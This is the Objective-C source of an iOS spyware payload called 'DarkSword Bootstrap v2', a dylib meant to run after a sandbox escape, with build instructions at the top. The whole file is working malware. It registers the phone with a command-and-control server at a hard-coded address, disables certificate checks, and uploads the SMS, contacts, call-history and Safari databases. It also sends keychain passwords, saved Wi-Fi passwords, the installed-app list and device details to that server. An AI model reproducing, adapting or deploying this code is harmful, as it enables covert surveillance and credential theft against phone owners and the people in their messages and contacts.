/**
 * DarkSword Bootstrap v2 - Enhanced bootstrap.dylib
 * Replaces Coruna's original bootstrap.dylib
 * 
 * _process() is called by Stage3 after sandbox escape
 * Reads iOS system databases and sends to C2 server
 *
 * Compile: clang -framework Foundation -framework CoreFoundation -framework UIKit -lsqlite3 -lcompression
 *          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e
 *          -miphoneos-version-min=15.0 -fobjc-arc -dynamiclib -o bootstrap.dylib src/main.m
 */

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sqlite3.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#import <compression.h>

// === C2 Configuration ===
#define C2_HOST "192.168.110.111"
#define C2_PORT 8081

// === HTTP Helper using CFNetwork ===
static NSData *httpPost(const char *urlStr, NSData *body) {
    CFStringRef urlCF = CFStringCreateWithCString(kCFAllocatorDefault, urlStr, kCFStringEncodingUTF8);
    CFURLRef url = CFURLCreateWithString(kCFAllocatorDefault, urlCF, NULL);
    CFRelease(urlCF);
    
    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(kCFAllocatorDefault, CFSTR("POST"), url, kCFHTTPVersion1_1);
    CFRelease(url);
    
    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"), CFSTR("application/json"));
    CFHTTPMessageSetBody(req, (__bridge CFDataRef)body);
    
    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(kCFAllocatorDefault, req);
    CFRelease(req);
    
    // Disable SSL validation for local network
    CFDictionaryRef sslSettings = CFDictionaryCreate(kCFAllocatorDefault,
        (const void*[]){kCFStreamSSLValidatesCertificateChain},
        (const void*[]){kCFBooleanFalse},
        1, NULL, NULL);
    CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, sslSettings);
    CFRelease(sslSettings);
    
    CFReadStreamOpen(stream);
    
    NSMutableData *response = [NSMutableData data];
    UInt8 buf[4096];
    CFIndex bytesRead;
    while ((bytesRead = CFReadStreamRead(stream, buf, sizeof(buf))) > 0) {
        [response appendBytes:buf length:bytesRead];
    }
    
    CFReadStreamClose(stream);
    CFRelease(stream);
    
    return response;
}

// === Report data to C2 ===
static void reportToC2(int deviceId, const char *reportType, NSDictionary *data) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/c2/report", C2_HOST, C2_PORT);
    
    NSDictionary *body = @{
        @"deviceId": @(deviceId),
        @"reportType": [NSString stringWithUTF8String:reportType],
        @"data": data
    };
    
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    httpPost(url, jsonData);
}

// === Upload file to C2 ===
static void uploadFile(int deviceId, NSString *fileName, NSData *fileData, NSString *fileType) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/upload", C2_HOST, C2_PORT);
    
    NSDictionary *body = @{
        @"deviceId": @(deviceId),
        @"fileName": fileName ?: @"",
        @"fileData": [fileData base64EncodedStringWithOptions:0] ?: @"",
        @"fileType": fileType ?: @"unknown"
    };
    
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    httpPost(url, jsonData);
}

// === SQLite Query ===
static NSArray *queryDB(const char *dbPath, const char *sql) {
    NSMutableArray *results = [NSMutableArray array];
    sqlite3 *db;
    
    if (sqlite3_open(dbPath, &db) != SQLITE_OK) {
        return results;
    }
    
    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        return results;
    }
    
    int cols = sqlite3_column_count(stmt);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        for (int i = 0; i < cols; i++) {
            const char *colName = sqlite3_column_name(stmt, i);
            NSString *key = [NSString stringWithUTF8String:colName];
            id val = nil;
            
            switch (sqlite3_column_type(stmt, i)) {
                case SQLITE_INTEGER:
                    val = @(sqlite3_column_int64(stmt, i));
                    break;
                case SQLITE_FLOAT:
                    val = @(sqlite3_column_double(stmt, i));
                    break;
                case SQLITE_TEXT:
                    val = [NSString stringWithUTF8String:(const char*)sqlite3_column_text(stmt, i)];
                    break;
                case SQLITE_BLOB:
                    val = [[NSData dataWithBytes:sqlite3_column_blob(stmt, i)
                                          length:sqlite3_column_bytes(stmt, i)] base64EncodedStringWithOptions:0];
                    break;
                case SQLITE_NULL:
                    val = [NSNull null];
                    break;
            }
            if (val) row[key] = val;
        }
        [results addObject:row];
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return results;
}

// === Register device and get ID ===
static int registerDevice(void) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/devices/register", C2_HOST, C2_PORT);
    
    UIDevice *device = [UIDevice currentDevice];
    NSString *udid = [NSString stringWithFormat:@"native_%@", [[NSUUID UUID] UUIDString]];
    
    NSDictionary *body = @{
        @"udid": udid,
        @"deviceName": device.name ?: @"Unknown",
        @"model": device.model ?: @"iPhone",
        @"osVersion": device.systemVersion ?: @"0",
        @"tagId": @"1"
    };
    
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    NSData *resp = httpPost(url, jsonData);
    
    NSDictionary *result = [NSJSONSerialization JSONObjectWithData:resp options:0 error:nil];
    if ([result[@"code"] intValue] == 0) {
        int deviceId = [result[@"data"][@"id"] intValue];
        NSLog(@"[DS] Registered device ID: %d", deviceId);
        return deviceId;
    }
    NSLog(@"[DS] Registration failed");
    return 0;
}

// === Send heartbeat ===
static void sendHeartbeat(int deviceId) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/heartbeat/1", C2_HOST, C2_PORT);
    
    UIDevice *device = [UIDevice currentDevice];
    NSDictionary *body = @{
        @"udid": [NSString stringWithFormat:@"native_%d", deviceId],
        @"model": device.model ?: @"iPhone",
        @"osVersion": device.systemVersion ?: @"0",
        @"agentActive": @YES,
        @"currentStage": @(5),
        @"exploitResult": @"native_success"
    };
    
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    httpPost(url, jsonData);
}

// === Collect SMS ===
static void collectSMS(int deviceId) {
    const char *path = "/var/mobile/Library/SMS/sms.db";
    struct stat st;
    if (stat(path, &st) != 0) {
        NSLog(@"[DS] SMS db not found");
        return;
    }
    
    // Upload raw db
    NSData *dbData = [NSData dataWithContentsOfFile:@(path)];
    if (dbData) {
        uploadFile(deviceId, @"sms.db", dbData, @"database");
    }
    
    // Query messages
    NSArray *msgs = queryDB(path,
        "SELECT m.text, m.date, m.is_from_me, h.id as handle "
        "FROM message m LEFT JOIN handle h ON m.handle_id = h.ROWID "
        "ORDER BY m.date DESC LIMIT 500");
    
    for (NSDictionary *msg in msgs) {
        reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
            @"platform": @"SMS",
            @"username": msg[@"handle"] ?: @"unknown",
            @"token": msg[@"text"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"date:%@,from_me:%@", msg[@"date"], msg[@"is_from_me"]]
        });
    }
    NSLog(@"[DS] SMS: %lu messages", (unsigned long)msgs.count);
}

// === Collect Contacts ===
static void collectContacts(int deviceId) {
    const char *path = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    struct stat st;
    if (stat(path, &st) != 0) {
        NSLog(@"[DS] Contacts db not found");
        return;
    }
    
    NSData *dbData = [NSData dataWithContentsOfFile:@(path)];
    if (dbData) {
        uploadFile(deviceId, @"AddressBook.sqlitedb", dbData, @"database");
    }
    
    NSArray *contacts = queryDB(path,
        "SELECT p.first, p.last, p.Organization, v.value as phone "
        "FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID = v.record_id "
        "WHERE v.property = 3 LIMIT 500");
    
    for (NSDictionary *c in contacts) {
        NSString *name = [NSString stringWithFormat:@"%@ %@", c[@"first"] ?: @"", c[@"last"] ?: @""];
        reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
            @"platform": @"Contacts",
            @"username": [name stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]],
            @"token": c[@"phone"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"org:%@", c[@"Organization"] ?: @""]
        });
    }
    NSLog(@"[DS] Contacts: %lu", (unsigned long)contacts.count);
}

// === Collect Call History ===
static void collectCallHistory(int deviceId) {
    const char *path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
    struct stat st;
    if (stat(path, &st) != 0) {
        NSLog(@"[DS] CallHistory db not found");
        return;
    }
    
    NSData *dbData = [NSData dataWithContentsOfFile:@(path)];
    if (dbData) {
        uploadFile(deviceId, @"CallHistory.storedata", dbData, @"database");
    }
    
    NSArray *calls = queryDB(path,
        "SELECT ZADDRESS as address, ZDATE as date, ZDURATION as duration, "
        "ZCALLTYPE as call_type, ZORIGINATED as originated "
        "FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 200");
    
    for (NSDictionary *call in calls) {
        reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
            @"platform": @"CallHistory",
            @"username": call[@"address"] ?: @"unknown",
            @"token": [NSString stringWithFormat:@"duration:%@", call[@"duration"]],
            @"cachedData": [NSString stringWithFormat:@"date:%@,type:%@", call[@"date"], call[@"call_type"]]
        });
    }
    NSLog(@"[DS] Calls: %lu", (unsigned long)calls.count);
}

// === Collect Safari History ===
static void collectSafariHistory(int deviceId) {
    const char *path = "/var/mobile/Library/Safari/History.db";
    struct stat st;
    if (stat(path, &st) != 0) {
        NSLog(@"[DS] Safari History db not found");
        return;
    }
    
    NSData *dbData = [NSData dataWithContentsOfFile:@(path)];
    if (dbData) {
        uploadFile(deviceId, @"History.db", dbData, @"database");
    }
    
    NSArray *history = queryDB(path,
        "SELECT url, title, visit_time FROM history_items ORDER BY visit_time DESC LIMIT 200");
    
    for (NSDictionary *item in history) {
        reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
            @"platform": @"Safari",
            @"username": item[@"url"] ?: @"",
            @"token": item[@"title"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"time:%@", item[@"visit_time"]]
        });
    }
    NSLog(@"[DS] Safari: %lu", (unsigned long)history.count);
}

// === Collect Keychain ===
static void collectKeychain(int deviceId) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    
    if (status == errSecSuccess && result) {
        NSArray *items = (__bridge_transfer NSArray *)result;
        for (NSDictionary *item in items) {
            NSString *service = item[(__bridge id)kSecAttrService] ?: @"";
            NSString *account = item[(__bridge id)kSecAttrAccount] ?: @"";
            NSData *data = item[(__bridge id)kSecValueData];
            NSString *password = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
            
            if (service.length > 0 || account.length > 0) {
                reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
                    @"platform": @"KEYCHAIN",
                    @"username": account,
                    @"token": password ?: @"",
                    @"cachedData": [NSString stringWithFormat:@"service:%@", service]
                });
            }
        }
        NSLog(@"[DS] Keychain: %lu items", (unsigned long)items.count);
    }
}

// === Collect WiFi ===
static void collectWiFi(int deviceId) {
    NSString *wifiPath = @"/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
    NSDictionary *wifiDict = [NSDictionary dictionaryWithContentsOfFile:wifiPath];
    
    if (wifiDict) {
        for (NSString *ssid in wifiDict.allKeys) {
            NSDictionary *network = wifiDict[ssid];
            NSString *password = network[@"Password"] ?: network[@"password"] ?: @"";
            reportToC2(deviceId, "WIFI_PASSWORD", @{
                @"ssid": ssid,
                @"password": password,
                @"securityType": network[@"SecurityType"] ?: @"unknown",
                @"bssid": network[@"BSSID"] ?: @""
            });
        }
        NSLog(@"[DS] WiFi: %lu networks", (unsigned long)wifiDict.count);
    }
}

// === Collect Installed Apps ===
static void collectInstalledApps(int deviceId) {
    NSString *appPath = @"/var/mobile/Library/Caches/com.apple.mobile.installation.plist";
    NSDictionary *appDict = [NSDictionary dictionaryWithContentsOfFile:appPath];
    
    if (appDict) {
        NSMutableArray *apps = [NSMutableArray array];
        NSDictionary *userApps = appDict[@"User"];
        if (userApps) [apps addObjectsFromArray:userApps.allKeys];
        NSDictionary *systemApps = appDict[@"System"];
        if (systemApps) [apps addObjectsFromArray:systemApps.allKeys];
        
        reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
            @"platform": @"InstalledApps",
            @"username": [NSString stringWithFormat:@"%lu apps", (unsigned long)apps.count],
            @"cachedData": [apps componentsJoinedByString:@","]
        });
        NSLog(@"[DS] Apps: %lu", (unsigned long)apps.count);
    }
}

// === Collect Device Info ===
static void collectDeviceInfo(int deviceId) {
    UIDevice *device = [UIDevice currentDevice];
    
    struct utsname systemInfo;
    uname(&systemInfo);
    
    NSDictionary *info = @{
        @"name": device.name ?: @"",
        @"model": device.model ?: @"",
        @"systemName": device.systemName ?: @"",
        @"systemVersion": device.systemVersion ?: @"",
        @"machine": [NSString stringWithUTF8String:systemInfo.machine],
        @"batteryLevel": @(device.batteryLevel),
        @"batteryState": @(device.batteryState),
        @"identifierForVendor": device.identifierForVendor.UUIDString ?: @""
    };
    
    reportToC2(deviceId, "SOCIAL_ACCOUNT", @{
        @"platform": @"DeviceInfo",
        @"username": [NSString stringWithFormat:@"%@ %@", device.model, device.systemVersion],
        @"cachedData": [NSString stringWithFormat:@"name:%@,machine:%@,battery:%.0f%%", 
                       device.name, [NSString stringWithUTF8String:systemInfo.machine], device.batteryLevel * 100]
    });
    
    NSLog(@"[DS] Device info collected: %@ %@", device.model, device.systemVersion);
}

// === Main Entry Point - called by Coruna Stage3 ===
__attribute__((visibility("default"))) void process(void) {
    NSLog(@"[DS] ====================================");
    NSLog(@"[DS] DarkSword Bootstrap v2 - _process()");
    NSLog(@"[DS] ====================================");
    
    @autoreleasepool {
        // Register device
        int deviceId = registerDevice();
        if (deviceId == 0) {
            NSLog(@"[DS] Registration failed, aborting");
            return;
        }
        
        // Send initial heartbeat
        sendHeartbeat(deviceId);
        
        // Collect all data
        NSLog(@"[DS] Collecting device info...");
        collectDeviceInfo(deviceId);
        
        NSLog(@"[DS] Collecting SMS...");
        collectSMS(deviceId);
        
        NSLog(@"[DS] Collecting contacts...");
        collectContacts(deviceId);
        
        NSLog(@"[DS] Collecting call history...");
        collectCallHistory(deviceId);
        
        NSLog(@"[DS] Collecting Safari history...");
        collectSafariHistory(deviceId);
        
        NSLog(@"[DS] Collecting keychain...");
        collectKeychain(deviceId);
        
        NSLog(@"[DS] Collecting WiFi...");
        collectWiFi(deviceId);
        
        NSLog(@"[DS] Collecting installed apps...");
        collectInstalledApps(deviceId);
        
        // Final heartbeat
        sendHeartbeat(deviceId);
        
        NSLog(@"[DS] ====================================");
        NSLog(@"[DS] Data collection complete!");
        NSLog(@"[DS] ====================================");
    }
}
